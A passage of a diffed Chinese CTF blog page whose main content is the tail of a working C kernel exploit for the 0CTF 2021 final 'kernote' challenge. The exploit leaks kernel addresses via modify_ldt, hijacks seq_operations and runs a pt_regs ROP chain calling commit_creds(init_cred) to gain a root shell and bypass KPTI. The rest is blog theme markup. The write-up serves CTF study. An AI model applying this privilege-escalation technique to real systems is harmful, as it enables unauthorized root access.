class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> entry_number;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> base_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> limit;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_32bit : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> contents : <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> read_exec_only : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> limit_in_pages : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_not_present : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> useable : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> lm : <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> add_rsp_pop_pop;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> iretq;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> shell_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6667</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6668</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">select</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6666</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6669</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    save_status();</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kernote&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">char</span> *tmp[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *info = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="built_in">memset</span>(info, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">    desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    create(<span class="number">0</span>);</span><br><span class="line">    select(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">delete</span> (<span class="number">0</span>);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> addr = <span class="number">0xffff888000000000</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf = addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        edit(*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf);</span><br><span class="line">        <span class="keyword">int</span> ret = syscall(SYS_modify_ldt, <span class="number">0</span>, tmp, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            addr += <span class="number">0x40000000</span>;</span><br><span class="line">            *(<span class="keyword">uint64_t</span> *)buf = addr;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base: %p\n&quot;</span>, addr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> search_addr = addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        edit(*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf);</span><br><span class="line">        <span class="keyword">if</span> (!fork())</span><br><span class="line">        &#123;</span><br><span class="line">            syscall(SYS_modify_ldt, <span class="number">0</span>, info, <span class="number">0x1000</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span> / <span class="number">8</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x040</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    kernel_base = info[i] - <span class="number">0x40</span>;</span><br><span class="line">                    kernel_offset = kernel_base - vmlinux_base;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%p\n&quot;</span>, kernel_base);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%p\n&quot;</span>, kernel_offset);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (kernel_base)</span><br><span class="line">        &#123;</span><br><span class="line">            kernel_offset = kernel_base - vmlinux_base;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        search_addr += <span class="number">0x1000</span>;</span><br><span class="line">        *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line">    &#125;</span><br><span class="line">    create(<span class="number">1</span>);</span><br><span class="line">    select(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">delete</span> (<span class="number">1</span>);</span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    add_rsp_pop_pop = <span class="number">0xffffffff817c21a6</span> + kernel_offset;</span><br><span class="line">    pop_rdi = <span class="number">0xffffffff81075c4c</span> + kernel_offset;</span><br><span class="line">    init_cred = <span class="number">0xffffffff8266b780</span> + kernel_offset;</span><br><span class="line">    commit_creds = <span class="number">0xffffffff810c9dd0</span> + kernel_offset;</span><br><span class="line">    swapgs = <span class="number">0xffffffff81078130</span> + kernel_offset;</span><br><span class="line">    iretq = <span class="number">0xffffffff810002df</span> + kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fba</span> + kernel_offset;</span><br><span class="line">    shell_addr = (<span class="keyword">uint64_t</span>)get_shell;</span><br><span class="line">    edit(add_rsp_pop_pop);</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   pop_rdi\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   init_cred\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   commit_creds\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   swapgs_restore_regs_and_return_to_usermode\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd\n&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220814163459547.png"
-                      alt="image-20220814163459547"
-                ></p>
+<p><img   src="/images/image-20220814163459547.png"  alt="image-20220814163459547"></p>
 <p><strong>题目放在：</strong><a class="link"   target="_blank" rel="noopener" href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p>
 <hr>
 <p>参考链接：<a class="link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/#Step-I-%E6%B3%84%E9%9C%B2-page-offset-base-1" >https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/#Step-I-%E6%B3%84%E9%9C%B2-page-offset-base-1<i class="fas fa-external-link-alt"></i></a></p>
 
-        </div>
+                    
+                </div>
 
-        
-
-        
-            <div class="article-nav">
                 
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2022/08/16/userfaultfd/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">userfaultfd利用</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/seq-operations/">seq_operations</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/modify-ldt/">modify_ldt</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/pt-regs/">pt_regs</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/bypass-kpti/">bypass kpti</a>
+                                    </li>
+                                
+                            </ul>
+                        
                     </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
-                           href="/2022/08/10/starCTF-2019-hackme/"
-                        >
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">starCTF 2019 hackme</span>
-                                <span class="post-nav-item">下一篇</span>
-                            </span>
-                            <span class="right arrow-icon flex-center">
-                              <i class="fas fa-chevron-right"></i>
-                            </span>
-                        </a>
+                    <div>
+                        
                     </div>
-                
-            </div>
-        
+                </div>
 
-        
-            <div class="comment-container">
-                <div class="comments-container">
-    <div id="comment-anchor"></div>
-    <div class="comment-area-title">
-        <i class="fas fa-comments">&nbsp;评论</i>
+                
+                    
+
+<div class="reward-author-container border-box flex-center">
+    <div class="reward-btn border-box flex-center tooltip tooltip-img"
+            data-tooltip-img-url="/images/reward.jpg"
+            data-tooltip-img-trigger="click"
+            data-tooltip-img-style="top: -6px;"
+    >
+        <i class="fa-solid fa-mug-hot"></i>&nbsp;激励牛马，加速创作！
     </div>
-    
+</div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2022/08/16/userfaultfd/"
+                                   title="userfaultfd利用"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">userfaultfd利用</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2022/08/10/starCTF-2019-hackme/"
+                                   title="starCTF 2019 hackme"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">starCTF 2019 hackme</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
 
         
             
+
     <div class="valine-container">
-        <script 
-                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
         <div id="vcomments"></div>
-        <script >
-            function loadValine() {
-                new Valine({
-                    el: '#vcomments',
-                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
-                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
-                    meta: ['nick', 'mail', 'link'],
-                    avatar: 'wavatar',
-                    enableQQ: true,
-                    placeholder: '😜若有问题请各位大师傅留言评论',
-                    lang: 'zh-CN'.toLowerCase()
-                });
-
-                function getAuthor(language) {
-                    switch (language) {
-                        case 'en':
-                            return 'Author';
-                        case 'zh-CN':
-                            return '博主';
-                        default:
-                            return 'Master';
-                    }
-                }
-
-                // Add "Author" identify
-                const getValineDomTimer = setInterval(() => {
-                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
-                    if (vcards.length > 0) {
-                        let author = '196082';
-
-                        if (author) {
-                            for (let vcard of vcards) {
-                                const vnick_dom = vcard.querySelector('.vhead .vnick');
-                                const vnick = vnick_dom.innerHTML;
-                                if (vnick === author) {
-                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
-                                }
-                            }
-                        }
-                        clearInterval(getValineDomTimer);
-                    } else {
-                        clearInterval(getValineDomTimer);
-                    }
-                }, 2000);
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        ></script>
+        <script 
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          window.KeepCommentPlugin.initValine = () => {
+            const config = {
+              el: '#vcomments',
+              appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
+              appKey: 'C672AAYGXMkHxztf8ntdLShs',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: '😜若有问题请各位大师傅留言评论',
+              lang: 'zh-CN'.toLowerCase()
             }
 
-            if ('false') {
-                const loadValineTimeout = setTimeout(() => {
-                    loadValine();
-                    clearTimeout(loadValineTimeout);
-                }, 1000);
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            if (window?.Valine) {
+              new Valine(config)
+              window.KeepCommentPlugin.hideLoading()
             } else {
-                window.addEventListener('DOMContentLoaded', loadValine);
+              setTimeout(() => {
+                window.KeepCommentPlugin.initValine()
+              }, 1000)
             }
+          }
+
+          if ('false' === 'true') {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initValine()
+            }, 1200)
+          } else {
+            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initValine)
+          }
         </script>
     </div>
 
 
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
 
         
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%E6%BC%94%E7%A4%BA"><span class="nav-text">例题演示</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2022-%E8%93%9D%E5%B8%BD%E6%9D%AF-%E5%8D%8A%E5%86%B3%E8%B5%9B-Smurfs"><span class="nav-text">2022 蓝帽杯 半决赛 Smurfs</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-text">利用过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bypass-kpti"><span class="nav-text">bypass kpti</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%EF%BC%8C%E5%BE%97%E5%87%BAexp"><span class="nav-text">综上，得出exp</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0CTF-2021-final-kernote"><span class="nav-text">0CTF 2021 final kernote</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-1"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">利用分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%EF%BC%8C%E5%BE%97%E5%87%BAexp-1"><span class="nav-text">综上，得出exp</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+        &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2024
+        
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">196082</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
     
-</div>
-
-            </div>
         
-    </div>
-</div>
-
-
-                
-            </div>
-
-        </div>
-
-        <div class="page-main-content-bottom">
-            <footer class="footer">
-    <div class="info-container">
-        <div class="copyright-info info-item">
-            &copy;
+        <div class="deploy-info info-item">
             
-              <span>2021</span>&nbsp;-&nbsp;
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
             
-            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">196082</a>
         </div>
-        
-            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-            <div class="website-count info-item">
-                
-                    <span id="busuanzi_container_site_uv">
-                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
-                    </span>
-                
-                
-                    <span id="busuanzi_container_site_pv">
-                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
-                    </span>
-                
-            </div>
-        
-        <div class="theme-info info-item">
-            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">335.6k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
         </div>
-        
-    </div>
+    
+
+    
 </footer>
 
         </div>
     </div>
 
+    <!-- post tools -->
     
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="tools-list">
-        <!-- TOC aside toggle -->
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
         
-            <li class="tools-item page-aside-toggle">
-                <i class="fas fa-outdent"></i>
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
             </li>
         
 
-        <!-- go comment -->
+        <!-- PC go comment -->
         
-            <li class="go-comment">
+            <li class="tools-item flex-center go-to-comments">
                 <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
             </li>
         
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
     </ul>
 </div>
 
         </div>
     
 
-    <div class="right-bottom-side-tools">
-        <div class="side-tools-container">
-    <ul class="side-tools-list">
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
         <li class="tools-item tool-font-adjust-plus flex-center">
             <i class="fas fa-search-plus"></i>
         </li>
@@ -584,13 +731,12 @@
             <i class="fas fa-search-minus"></i>
         </li>
 
-        <li class="tools-item tool-expand-width flex-center">
-            <i class="fas fa-arrows-alt-h"></i>
-        </li>
-
-        <li class="tools-item tool-dark-light-toggle flex-center">
-            <i class="fas fa-moon"></i>
-        </li>
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
 
         <!-- rss -->
         
@@ -604,42 +750,45 @@
             </li>
         
 
-        
-            <li class="tools-item tool-scroll-to-top flex-center">
-                <i class="fas fa-arrow-up"></i>
-            </li>
-        
-
+        <!-- to bottom -->
         <li class="tools-item tool-scroll-to-bottom flex-center">
             <i class="fas fa-arrow-down"></i>
         </li>
     </ul>
 
-    <ul class="exposed-tools-list">
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
         <li class="tools-item tool-toggle-show flex-center">
             <i class="fas fa-cog fa-spin"></i>
         </li>
-        
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
     </ul>
 </div>
 
     </div>
 
-    
-        <aside class="page-aside">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
